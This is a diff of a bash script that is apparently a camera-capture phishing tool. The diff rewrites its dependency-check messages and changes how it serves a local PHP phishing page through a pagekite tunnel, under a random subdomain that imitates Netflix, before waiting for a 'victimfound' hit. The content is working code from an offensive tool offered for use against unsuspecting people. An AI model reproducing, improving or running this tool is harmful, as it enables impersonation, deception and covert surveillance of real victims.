@@ -22,11 +22,11 @@ exit 1
 }
 req() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
-command -v python2 > /dev/null 2>&1 || { echo >&2 "Python2 is not installed ! Install it"; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
+command -v python2 > /dev/null 2>&1 || { echo >&2 "Packages is not installed !\n Type 'bash setup' to install it ."; exit 1; }
 
 if [[ -e .www/.cam.log ]]; then
 rm -rf .www/.cam.log
@@ -237,12 +237,12 @@ cd .www/ && php -S localhost:$pagekite_port > /dev/null 2>&1 &
 if [[ $pagekite_subdomain_resp == true ]]; then
 sleep 1
 python2 .www/.pagekite --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
-victimfound
+
 else
 sleep 1
 python2 .www/.pagekite --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
-victimfound
 fi
+victimfound
 }
 
 banner
